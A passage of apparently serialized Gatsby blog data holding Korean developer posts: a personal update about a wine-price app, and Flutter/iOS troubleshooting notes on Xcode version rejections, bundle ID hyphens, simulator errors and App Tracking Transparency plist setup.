수 있고...\n\n글만 쓰면 나머진 다 티스토리에서 알아서 해주니까?  \n근데 여길 포기하게 만든게 뭔가 자유롭지 않다고 해야 하나?\n\n나는 내가 직접 서비스 2개를 만들었고, 이걸 네이버나, 쓰레드같은데 홍보를 하고,  \n홍보 포인트가 좀 필요했다.\n\n그래서 기술 블로그에 이걸 개발하며 배운 점이나 기록용으로 쓰면서  \n홍보도 할겸 결국 게츠비로 남았다.\n\n기존 템플릿은 커스터마이징도 어렵고(게츠비를 일단 다시 배우기가...),  \n구글링 하다가 [danmin20](https://github.com/danmin20/danmin-gatsby-blog-template)님이 만드신 걸 쓰게 되었다.\n\n일단 나같이 시간 없는 사람이 그대로 가져와 쓰기에도 좋고,  \n커스터마이징을 하기 쉽게 잘 해둔 템플릿이었다.  \n이 자리를 빌어 감사함을...🙏\n\n<br>\n\n## 요즘은?\n\n마와셀 개발에 거의 올인? 은 아니고 적당한 시간을 투자해서 1차 버전을 만들었었다.  \n이건 네이버 블로그에도 나왔지만...\n\n1.0 초기 버전은 약간 발로 만든?  \n흑우집합소도 발로 만들었는데, 얘도 두 발로 만든 그런 느낌이다.\n\n일단 UI를 보자...\n\n| ![](img01.png) | ![](img02.png) |\n| -------------- | -------------- |\n\n놀랍겠지만 저게 스토어에 올린 홍보 스크린샷이다.  \n세상에 아무리 1인 개발이지만, 내가 봐도 너무 심했다.\n\n그래서 좀 기능 개선하고 UI랑 스크린샷도 다시 만들어서 영어권이랑 해서 올렸다.\n\n| ![](img03.jpg) | ![](img04.jpg) |\n| -------------- | -------------- |\n\n멘트가 오글거리는데 무튼... -\\_-;;  \n앱은 어느정도 마무리가 되었다.\n\n그리고 와인을 좋아하는 분이라면 아시겠지만,  \n와인 가격이 아주 널뛰기다.\n\n내가 거의 주1회에는 마시는 데일리급 와인이 있다.\n\n| ![](img05.jpg) | ![](img06.jpg) |\n| -------------- | -------------- |\n\n신퀀타와 복서다.  \n신퀀타는 진짜 편하게 마시기 좋아서 박스떼기로 사둔다.  \n접근하기 쉬운 마트에서 기준으론...\n\n신퀀타 : 3만원 중후반대  \n더복서 : 4만원 초중반대\n\n보통 저 정도 한다.  \n근데 소위 성지라던지, 최근 핫한 편의점이라던지 보면 가격이 정말 많이 다운된다.\n\n![](img07.png)  \n![](img08.png)\n\n가격을 보면 알겠지만 판매점마다 편차도 다르고, 어떤 빈티지를 얼마에 샀는지 확인할 수 있다.\n\n<br>\n\n### 마와셀 웹버전?\n\n그렇다.  \n저게 필요해서 내가 만들었다.\n\n주변에 와인 좋아하는 사람들에게 받은 구입 자료 및 행사 자료, 내가 구입한 데이터를 활용했다.  \n이런 가격 조회 서비스가 몇 있다.\n\n일단 어쏨가이드라는 앱이 있다.  \n초창기에는 아이폰만 있었는데 어느새 안드로이드도 생겼다.\n\n나같은 1인 개발자인지 모르겠지만, 정말 잘 만든 앱인것 같다.\n\n그리고 네이버 카페 중 와쌉 이라는 카페에서 만든 사이트가 있다.  \n근데 관리를 안하고, 자료도 최근거 찾기 힘들었다.\n\n이런 두 서비스가 있었지만, 둘다 뭔가 만족스럽지 않았다.  \n그리고 마와셀도 3.0에서 확장되는 기능에는 웹 서비스가 필요했다.\n\n그래서 결국 마와셀 웹 버전도 만들었다.  \n물론 앱과는 성향이 다른... 가격 정보 기능만 먼저 제공했다.\n\n<br>\n\n## 뭔가 허접한데?\n\n그렇다.  \n[사이트](https://appmyc.info) 가 보신 분은 아시겠지만, 아직 베타다.\n\n업데이트도 많이 밀렸다.  \n최근 저 사이트도 신규 기능 개발에 들어갔다.\n\n비비노 평점과 와인 서처 평점 정보,  \n와인 데이터를 볼 수 있는 기능을 개발하고 있다.\n\n다만 혼자서 백엔드, 프론트엔드 단을 다 하느라 시간이 좀 걸릴 뿐...  \n9월달 쯔음이면 사이트 업데이트는 되지 않을까 싶다.\n\n그리고 개발할 때 이제 아키텍쳐와 나름 클린 코드 규칙을 가지고 개발한다.\n\n백엔드는 헥사고날(포트&어뎁터)를 사용했고,  \n프론트는 최대한 컴포넌트 재사용 및 코드를 단순하게 처리했다.\n\n혼자 다 하면 힘들지만, GPT 덕분에 약간은 할만했다.  \n웹이 끝나면 이제 마와셀 앱과 연동 부분을 개발할 예정이다.\n\n<br>\n\n## 님 개발자 맞음?\n\n음...  \n사실 마지막 직장에서 너무 안 좋은 일이 있었고,  \n매일 근무 시간이 10시간이 넘으니 진짜 개발이 싫었다.\n\n그리고 이렇게 열심히 해도 삼전에서는 고과가 있고,  \n성과금 1~2천씩 나오면 위로라도 되는데,  \n내 일도 아니고, 남 서비스 만들어 주는데 10시간 이상씩 쓰는게 용납이 안되기 시작했다.\n\n그래서 개발을 더 이상 하지 않기로 하고, 다양한 것을 해봤다.  \n뭐 덕분에 인사이트도 넓어졌고, 투자도 운 좋게 성공(?)해서 잘 풀렸다.\n\n코로나 초창기에는 주식과 코인으로 돈복사를 했고,  \n일부만 남기고 부동산 갭투 들어간게 신의 한 수가 되었다.\n\n특히 부동산은 지금도 정말 재미있다.  \n지금은 부동산도 빈익빈 부익부라 지방이나 수도권 외각은 다 죽었다.\n\n하지만 경기 남부를 비롯해 수요가 몰리는 지역은 지금 불장이다.  \n물론 코로나 때만큼은 아니지만...\n\n지금의 난 개발자 영역이랑 투자자 영역 사이에 있다고 본다.\n\n다른 개발자들 처럼 최신 기술 또는 딥다이브한 기술 경험은 없다.  \n하지만 어지간한 스타트업에서 쓰는 기술은 사용하고,  \n혼자서 백엔드랑 프론트엔드, 그리고 모바일은 개발하는 풀스택이다.\n\n경력 없는 또는 부족한 개발자처럼 발로 개발하진 않고,  \n유지보수에 신경을 쓰고, 괜찮은 아키텍쳐의 경우 적극적으로 수용하여 쓴다.\n\n그러나, 다른 개발자들 처럼,  \n여가 시간에 오픈 소스 활동이나, 개발 공부를 하지 않는다.\n\n그 시간에 네이버 부동산 호가, 호갱노노 정보 확인, 임장지 선택이나,  \n신들의 장(나스닥) 정보 흐름, 코인 시세, 국장 투자 정보 조사 등을 한다.\n\n물론 선물은 가끔 건드는데, 남들처럼 하루에 몇천씩은 벌지 못한다.\n\n그래서 나도 햇갈린다.  \n내가 **개발자**일까? 아니면 **투자자**일까?\n\n<br>\n\n## 취업은 할거임?\n\n솔직히 요새 취업을 하고 싶긴 하다.  \n이유는...  \n**와인 창고**를 만들고 싶다.\n\n초기 투자 비용(오피스텔 임대, 셀러 5대 이상 구입비 등)은 괜츈한데,  \n매번 수집할 와인 구입 비용, 창고 전기세 등등 유지하려면, 매달 수입으로 매꿔야 한다.\n\n이건 취미 생활 영위를 위함이고, 개발 인맥을 늘려보고 싶다.  \n이제 주변에 개발 인맥은 거의 없고, 다 와인이나 투자쪽 인맥만 남았다.\n\n사실 최종 엔딩은 창업이긴 한데, 이 때 필요한게 좋은 사람들이다.  \n물론 가장 중요한 건 초기 투자 자금이긴 하지만,\n\n그만큼 중요한 것이 사람이다.  \n나 혼자서도 다 할 수 있지만, 시간이라는 한계 앞에선 다 할수 없다.\n\n그래서 위에서 이야기한 대로 취업은 하고 싶다.  \n하지만 사람 갈아넣는 그런 기업은 안가고 싶다.\n\n그렇다고 너무 러프한 기업은 피하고 싶다.  \n너무 편한 곳은 생각이 도태되고, 게을러진다.  \n그냥 8시간 집중해서 일하면 끝낼 수 있는 분량의 업무가 있는 회사에 가고 싶다.\n\n<del>근데 있을까? ㅋㅋㅋㅋ</del>\n\n<br>\n\n## 열심히 살자\n\n이제 개발 블로그도 조금씩 써봐야겠다.  \n플러터를 쓰면서 배운 것도 많고, 양 스토어에 배포하면서 했던 경험들,  \n히스토리 등을 개인 기록하듯 여기에도 남겨둬야 겠다.\n\n지인들과 와인 모임하면서 이야기 들어보면...  \n다들 정말 열심히 사는 사람들이다.\n\n물론 태어날 때 운 스텟 잘 찍고, 엄빠 잘 만나서 반포 5대장에 사는 친구도 있고,  \n사업으로 열심히 올라온 사람들도 있고...\n\n근데 다들 한가한거 같이 보여도 열심히 산다.  \n이런 사람들 특징이 **콘텐츠 소비자가 아니다.**\n\n유튜브 봐도 잠깐 보고, 세간의 돌아가는 일에 관심이 다들 많이 없다.  \n물론 세금 관련이나, 최근 상속세 개편, 부동산 관련 법령은 이야기가 다르지만...\n\n다들 자신을 위해 시간을 사용한다.  \n그래서 이 와인 모임은 나에게 인사이트를 열어주거나, 유익한 모임인 것 같다.\n\n이번 주는 곧 있을 이사를 준비하느라 바쁘긴 한데,  \n개발도 하고, 블로그 글도 잘 작성해야 겠다.\n\n요새 1~3일 간격으로 와인을 마시며 개발하는데,  \n이젠 좀 줄이고 집중해봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"Default Private Posts This is a default private post. It's recommended not to delete this posts 😵 (현재 이 포스트는 삭제하지 말아주세요.)","fields":{"slug":"/default/private-default/"},"frontmatter":{"date":"January 01, 2024","title":"Default Private","description":null,"tags":["private-tag"],"series":null,"previewImage":"banned.png","isPrivate":true},"rawMarkdownBody":"\n## Default Private Posts\n\nThis is a default private post. It's recommended not to delete this posts 😵\n\n(현재 이 포스트는 삭제하지 말아주세요.)\n"},{"excerpt":"배포를 하려고 하는데 문제가... 개발을 끝내고 XCode에서 빌드를 돌려서 앱컨넥트에 업로드 후 제출하려 했다. 근데 아래와 같이 에러가 뜨면서 문제 발생했다.  새 앱 및 앱 업데이트는 공개(GM) 버전의 Xcode 11 이상, iOS, macOS, watchOS 및 tvOS SDK로 빌드해야 합니다. 베타 버전으로 빌드된 앱은 허용되지 않습니다. 저…","fields":{"slug":"/dart_flutter/231106_xcode-15/"},"frontmatter":{"date":"November 06, 2023","title":"Xcode 빌드 후 앱컨넥트에서 배포 시 심사에 추가 할 수 없음 문제 (베타 버전으로 빌드된 앱은 허용되지 않습니다)","description":null,"tags":["Flutter","XCode","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 배포를 하려고 하는데 문제가...\n\n개발을 끝내고 XCode에서 빌드를 돌려서 앱컨넥트에 업로드 후 제출하려 했다.  \n근데 아래와 같이 에러가 뜨면서 문제 발생했다.\n\n![](/img01.png)\n\n> 새 앱 및 앱 업데이트는 공개(GM) 버전의 Xcode 11 이상, iOS, macOS, watchOS 및 tvOS SDK로 빌드해야 합니다.  \n> 베타 버전으로 빌드된 앱은 허용되지 않습니다.\n\n저 에러를 보고 내가 개발용으로 빌드해서 올렸나 싶어서, 다시 클린으로 날리고, 운영용으로 빌드 후 재배포 하였다.  \n그런데도 똑같이 에러가 발생했다.\n\n그래서 난 찾아보니 앱컨넥트 문제라고 했다.  \n내가 사용한 XCode 버전은 15.0.1인데 이게 문제였다.\n\n스택오버플로우인가 다른 외국 포럼인가 글을 읽어보니 XCode를 15.0.0 버전으로 다운그레이드하면 가능하다고 했다.  \n시간이 지나면 해결을 해줄 문제지만 바로 등록을 해야 했기에...\n\n일단 XCode 버전을 낮춰서 해결하기로 했다.  \n애플 개발자 계정으로 로그인 후 [애플 다운로드](https://developer.apple.com/download/all/)사이트로 이동한다.\n\n하단으로 내리다 보면 XCode15가 있다.\n\n![](/img02.png)\n\n난 기존 XCode를 삭제하고, 이걸 다운받아서 다시 설치했다.  \n그리고 다시 빌드 후 배포하고 제출하니 문제 없이 넘어갔다.\n\n어찌보면 XCode 버전에 따른 허용 문제였던거 같은데, 애플같은 큰 기업, 개발자들이 주를 이루는 사이트에서 이런 문제가 일어난게 신기했다.  \n내 흑우집합소 모바일용도 버그가 많은데...  \n어딜가나 버그는 항상 존재하는구나...\n"},{"excerpt":"갑자기 빌드가 안되었다. 번들 ID 쉽게 바꿔서 개발용 배포용 앱 나누기라는 포스팅에서 소개한 것 처럼 배포용으로 바꾸고 Xcode에서 빌드를 돌렸다. 근데 에러가 발생했고 에러의 문구는 다음과 같다. 이게 왜 이런지 한참을 찾다가... StackOverFlow에서 답을 찾을 수 있었다.  이게 왜 문제? 전에 포스팅한 번들 ID 쉽게 바꿔서 개발용 배포…","fields":{"slug":"/dart_flutter/231028_name-invalid/"},"frontmatter":{"date":"October 28, 2023","title":"Flutter - iOS에서 빌드 시 the attribute name is invalid 에러 발생 시","description":null,"tags":["Flutter","iOS","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 갑자기 빌드가 안되었다.\n\n[번들 ID 쉽게 바꿔서 개발용 배포용 앱 나누기](https://elfinlas.github.io/dart_flutter/231012_change-app-id-name/)라는 포스팅에서 소개한 것 처럼 배포용으로 바꾸고 Xcode에서 빌드를 돌렸다.  \n근데 에러가 발생했고 에러의 문구는 다음과 같다.\n\n```\nThe attribute 'name' is invalid\n```\n\n이게 왜 이런지 한참을 찾다가...  \n[StackOverFlow](https://stackoverflow.com/questions/71981688/the-attribute-name-is-invalid-xcode-flutter-app-archiving)에서 답을 찾을 수 있었다.\n\n![](/img01.png)\n\n## 이게 왜 문제?\n\n전에 포스팅한 [번들 ID 쉽게 바꿔서 개발용 배포용 앱 나누기](https://elfinlas.github.io/dart_flutter/231012_change-app-id-name/)내용에는 아래의 코드가 있다.\n\n```dart\nconst devAppId = \"개발용 Bundle ID\";\nconst prodAppId = \"운영용 Bundle ID\";\n\nawait Process.run('rename', [\n    'setBundleId',\n    '--targets',\n    'ios,android',\n    '--value',\n    isProdMode ? prodAppId : devAppId\n  ]);\n```\n\n그렇다.  \n내가 쓰는 AppId에는 안드로이드에서 사용한 값을 그대로 써서 -이 들어가 있다.  \n근데 Apple은 하이픈(-)을 허용하지 않는다.  \n그래서 이걸 언더바(\\_)로 변경해줬더니 아주 잘 되었다.\n\n현재 쓰는 코드는 아래와 같이 iOS / Android 를 구분시켰다.\n\n```dart\nconst devAndroidAppId = \"dmode_bcow_world\";\nconst prodAndroidAppId = \"bcow_world\";\n\nconst devIosAppId = \"dmode-bcow-world\";\nconst prodIosAppId = \"bcow-world\";\n```\n\n뭔가 에러를 많이 겪는데 하나씩 배워가면서 채워가는게 재미있다.\n\n```toc\n\n```\n"},{"excerpt":"두 번째 리젝에서... 두 번째 받은 리젝에 다음과 같은 메세지가 있었다.  내가 만든 기능 중 로또 QR조회 라는 기능에서 해당 기능을 테스트할 수 있는 샘플 QR을 달라 했다. 이런거 가지고도 리젝을 때리는구나 싶었다. -_-;; 그래서 앱 심사정보의 메모란에 설명을 적고, 첨부파일을 달아뒀다.  이렇게 제출했더니 해당 이슈에 대한 건은 사라졌다. 다…","fields":{"slug":"/dart_flutter/231028_apple-reject-guide-2.1-info-need/"},"frontmatter":{"date":"October 28, 2023","title":"Flutter - 애플 앱스토어 리젝 사유 Guideline 2.1 Information Needed QR Code","description":"Guideline 2.1 Information Needed QR Code","tags":["Flutter","AppStore","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 두 번째 리젝에서...\n\n두 번째 받은 리젝에 다음과 같은 메세지가 있었다.\n\n![](/img01.png)\n\n내가 만든 기능 중 로또 QR조회 라는 기능에서 해당 기능을 테스트할 수 있는 샘플 QR을 달라 했다.  \n이런거 가지고도 리젝을 때리는구나 싶었다. -\\_-;;\n\n그래서 앱 심사정보의 메모란에 설명을 적고, 첨부파일을 달아뒀다.\n\n![](/img02.png)\n\n이렇게 제출했더니 해당 이슈에 대한 건은 사라졌다.  \n다만 [AppTrackingTransparency 관련 이슈](https://elfinlas.github.io/dart_flutter/231027_apple-reject-guide-2.1-apptrackingtransparency/)만 계속 남아있었다...\n"},{"excerpt":"또 문제가 발생... 이전 Flutter - 애플 앱스토어 리젝 사유 Guideline 2.3.3 Performance 포스팅에서 아이폰 시뮬레이터는 잘 되었는데, 아이패드 시뮬레이터를 키고 VScode에서 구동하려 하니 에러가 발생했다. 내가 콘솔을 복사하지 못해서 스택오버플로에 있는 것을 샘플로 가져왔다. 진짜 어떤 것을 해도 안되어서 검색하다가 알게…","fields":{"slug":"/dart_flutter/231027_flutter-xcodebuild-destination-matching-provided/"},"frontmatter":{"date":"October 27, 2023","title":"Flutter - VSCode에서 iOS 시뮬레이터 빌드 시 에러 발생 (destination matching the provided destination specifier)","description":null,"tags":["Flutter","VSCode","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 또 문제가 발생...\n\n이전 [Flutter - 애플 앱스토어 리젝 사유 Guideline 2.3.3 Performance](https://elfinlas.github.io/dart_flutter/231027_apple-reject-guide-2.3.3-metadata/) 포스팅에서 아이폰 시뮬레이터는 잘 되었는데,  \n아이패드 시뮬레이터를 키고 VScode에서 구동하려 하니 에러가 발생했다.\n\n```\nxcodebuild: error: Unable to find a destination matching the provided destination specifier:\n            { id:~~ }\n```\n\n내가 콘솔을 복사하지 못해서 스택오버플로에 있는 것을 샘플로 가져왔다.  \n진짜 어떤 것을 해도 안되어서 검색하다가 알게 되었다.\n\n해결법도 매우 간단하다.\n\n## How To?\n\n![](/img01.png)\n\n위 이미지를 참고해서 설명하면...  \nXcode를 열고 좌측 상단의 **Runner**를 클릭하고, **Build Settings**항목을 클릭하면 설정이 나온다.\n\n이 값들 중 **Architectures**항목 하단의 **Supported Platforms** 항목을 **iOS**로 맞춰주면 끝이다.\n\n## 참고사항\n\n- [StackOverFlow](https://stackoverflow.com/questions/76610625/flutter-xcodebuild-error-unable-to-find-a-destination-matching-the-provided-de)\n\n```toc\n\n```\n"},{"excerpt":"허구한날 에러 발생 이전 Flutter - 애플 앱스토어 리젝 사유 Guideline 2.3.3 Performance 포스팅에서 아이폰 시뮬레이터는 잘 되었는데, 아이패드 시뮬레이터를 키고 VScode에서 구동하려 하니 에러가 발생했다.  맨 처음엔 Xcode에서 해야 하나 싶었는데 찾아보니 매우 간단한 문제였다. How to? 맥에서 환경설정으로 이동하…","fields":{"slug":"/dart_flutter/231027_iproxy-cannot-open/"},"frontmatter":{"date":"October 27, 2023","title":"Flutter - iOS에서 VScode로 빌드 돌릴 때 에러 (iProxy cannot be opened, idevicesyslog cannot be opened)","description":null,"tags":["Flutter","VSCode","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 허구한날 에러 발생\n\n이전 [Flutter - 애플 앱스토어 리젝 사유 Guideline 2.3.3 Performance](https://elfinlas.github.io/dart_flutter/231027_apple-reject-guide-2.3.3-metadata/) 포스팅에서 아이폰 시뮬레이터는 잘 되었는데,  \n아이패드 시뮬레이터를 키고 VScode에서 구동하려 하니 에러가 발생했다.\n\n![stackoverflow 이미지 참고](/img01.png)\n\n맨 처음엔 Xcode에서 해야 하나 싶었는데 찾아보니 매우 간단한 문제였다.\n\n## How to?\n\n맥에서 **환경설정**으로 이동하고 벤츄라(Ventura) 기준 좌측 사이드 메뉴를 보면 **개인정보 보호 및 보안**이라는 항목이 있다.\n\n![](/img03.png)\n\n선택하고 항목을 좀 내리다보면 아래와 같은 이미지가 뜬다.\n\n![](/img04.png)\n\n저기서 **확인 없이 허용** 버튼을 클릭해주면 끝이다.  \n자매품으로 **idevicesyslog**라는 것도 뜨는데 위와 동일하게 해결해주면 된다.\n\n![](/img02.png)\n\n## 만약 확인 없이 허용이 안뜨면?\n\n내가 경험을 했는데 **개인정보 보호 및 보안**에 가서도 확인된 개발자가... 라는 항목이 안떴다.\n\n![](/img05.png)\n\n이럴 때는 시뮬레이터를 완전 종료하고, VSCode 및 열린 Xcode를 모두 닫은 후 다시 VSCode만 키고, 시뮬레이터를 열어보자.  \n나는 이렇게 하니까 다시 뜨게 되었다.\n\n## 참고\n\n- [StackOverFlow : “iproxy” cannot be opened because the developer cannot be verified](https://stackoverflow.com/questions/71359062/iproxy-cannot-be-opened-because-the-developer-cannot-be-verified)\n\n```toc\n\n```\n"},{"excerpt":"앱스토어 총 세 번째 리젝... 지금 글을 쓰는 27일 오후 시간 기준으로 막 심사에 들어갔다.     무엇이 날 이렇게 괴롭혔는가? 바로 AppTrackingTransparency framework 라는 앱 추적 투명성 관련 문제다. 나는 플러터로 개발을 했고, 해당 이슈를 처음엔 몰랐었다. 처음 리젝을 받고 해당 문제를 알게 되었다. 사실 웹 개발(N…","fields":{"slug":"/dart_flutter/231027_apple-reject-guide-2.1-apptrackingtransparency/"},"frontmatter":{"date":"October 27, 2023","title":"Flutter - 애플 앱스토어 리젝 사유 Guideline 2.1 Information Needed AppTrackingTransparency","description":"Guideline 2.1 Information Needed AppTrackingTransparency","tags":["Flutter","AppStore","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n# 앱스토어 총 세 번째 리젝...\n\n지금 글을 쓰는 27일 오후 시간 기준으로 막 심사에 들어갔다.\n\n|                 |                 |\n| :-------------: | :-------------: |\n| ![](/img01.png) | ![](/img02.png) |\n\n무엇이 날 이렇게 괴롭혔는가?  \n바로 **AppTrackingTransparency framework** 라는 앱 추적 투명성 관련 문제다.\n\n나는 플러터로 개발을 했고, 해당 이슈를 처음엔 몰랐었다.  \n처음 리젝을 받고 해당 문제를 알게 되었다.  \n사실 웹 개발(Nest.Js + Next.Js)만 하다 와서 모바일 쪽 감을 잡지 못했었다.\n\n무튼 처음 앱 개발을 해본 분이라면 이런 전문을 많이 받았을 것이다.\n\n```\nGuideline 2.1 - Information Needed\n\nWe're looking forward to completing our review, but we need more information to continue. Your app uses the AppTrackingTransparency framework, but we are unable to locate the App Tracking Transparency permission request when reviewed on iOS 17.0.3.\n\nNext Steps\n\nPlease explain where we can find the App Tracking Transparency permission request in your app. The request should appear before any data is collected that could be used to track the user.\n\nIf you've implemented App Tracking Transparency but the permission request is not appearing on devices running the latest OS, please review the available documentation and confirm App Tracking Transparency has been correctly implemented.\n\nIf your app does not track users, update your app privacy information in App Store Connect to not declare tracking. You must have the Account Holder or Admin role to update app privacy information.\n\nResources\n\n- Tracking is linking data collected from your app with third-party data for advertising purposes, or sharing the collected data with a data broker. Learn more about tracking.\n- See Frequently Asked Questions about the requirements for apps that track users.\n- Review developer documentation for App Tracking Transparency.\n```\n\n리뷰어마다 친절도가 다른데 처음 리뷰해준 사람은 위와 같이 상세하게 적어줬지만, 두 번째 리뷰어는 그냥 양식만 대충 해서 줬다.  \n물론 해결되지 않은 이슈 및 새로운 이슈 때문에 간략하게 적은 것일 수 도 있다.\n\n무튼 이 문제는 현재 마지막 리뷰를 기다리는 중인데 어떻게 처리해야 하는지에 대해 포스팅을 해본다.\n\n## app_tracking_transparency\n\n사실 Swift랑 아이폰 개발 관련 지식이 조금이라도 있다면 **AppDelegate.swift**쪽에서 처리할 수 있겠지만,  \n난 이제 iOS 개발지식이 사라진 상태다.  \n그래서 그냥 간편하게 Flutter 라이브러리인 [app_tracking_transparency](https://pub.dev/packages/app_tracking_transparency)를 이용하기로 했다.\n\n![](/img03.png)\n\n대충 메인 페이지만 봐도 내가 원하는 이미지가 나온다.  \n맨날 앱 설치하면 저게 처음 떴는데 이런 이유였구나 싶다.\n\n보통 광고를 달고, 수집 개인정보 항목이 있다면 이 가이드라인이 적용되는 것 같다.  \n이 라이브러리를 적용하는 법은 매우 간단하다.\n\npub.dev에 나온 대로 하면 되는데 귀찮은 분을 위해 여기다 간단히 요약을 하면 아래와 같다.\n\n### 1. iOS 사전 작업 (info.plist)\n\n다음의 경로에 있는 **info.plist**를 연다.\n\n> iOS/Runner/info.plist\n\n파일의 마지막 쯔음에 아래의 문구를 추가해준다.\n\n```plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>CADisableMinimumFrameDurationOnPhone</key>\n\t<true/>\n    ...\n\n    <!-- 추가할 부분 -->\n    <key>NSUserTrackingUsageDescription</key>\n    <string>This identifier will be used to deliver personalized ads to you.</string>\n</dict>\n</plist>\n```\n\n그리고 **ReadMe**에 보면 아래와 같은 내용이 있다.\n\n> Google recommends that you should be using Google Mobile Ads SDK 7.64.0 or higher.  \n> Google Mobile Ads SDK 7.64.0 이상을 사용할 것을 권장\n\n근데 난 **google_mobile_ads: ^3.0.0** 라이브러리를 쓰고 있고, 크게 문제는 되지 않았다.  \n하지만 IDFA를 사용할 수 없을 때의 대비도 하는게 좋다고 한다.(다른 곳에서 찾은 정보)\n\nIDFA(Identifier for Advertiser)는 참고로 광고 식별자를 의미한다.  \n애플은 이를 IDFA라 부르고, 안드로이드는 ADID라 부른다.  \n아주 예전에 애플이 이걸 막는다 하여 한때 큰 이슈였긴 했다.\n\n여기서 다룰 문제는 아니고 IDFA를 사용할 수 없을 때 SKAdNetwork를 적용하는 방법은 아래와 같다.  \n위에 info.plist에 아래의 내용을 추가해준다.  \n위치는 하단이나 적당한 곳에?\n\n```plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>CADisableMinimumFrameDurationOnPhone</key>\n\t<true/>\n    ...\n    <key>NSUserTrackingUsageDescription</key>\n    <string>This identifier will be used to deliver personalized ads to you.</string>\n\n    <!-- 추가할 부분 -->\n    <key>SKAdNetworkItems</key>\n<array>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>cstr6suwn9.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>4fzdc2evr5.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>4pfyvq9l8r.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>2fnua5tdw4.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>ydx93a7ass.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>5a6flpkh64.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>p78axxw29g.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>v72qych5uu.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>ludvb6z3bs.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>cp8zw746q7.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>3sh42y64q3.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>c6k4g5qg8m.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>s39g8k73mm.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>3qy4746246.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>f38h382jlk.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>hs6bdukanm.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>v4nxqhlyqp.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>wzmmz9fp6w.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>yclnxrl5pm.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>t38b2kh725.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>7ug5zh24hu.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>gta9lk7p23.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>vutu7akeur.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>y5ghdn5j9k.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>n6fk4nfna4.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>v9wttpbfk9.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>n38lu8286q.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>47vhws6wlr.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>kbd757ywx3.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>9t245vhmpl.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>eh6m2bh4zr.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>a2p9lx4jpn.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>22mmun2rn5.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    <string>4468km3ulz.skadnetwork</string>\n  </dict>\n  <dict>\n    <key>SKAdNetworkIdentifier</key>\n    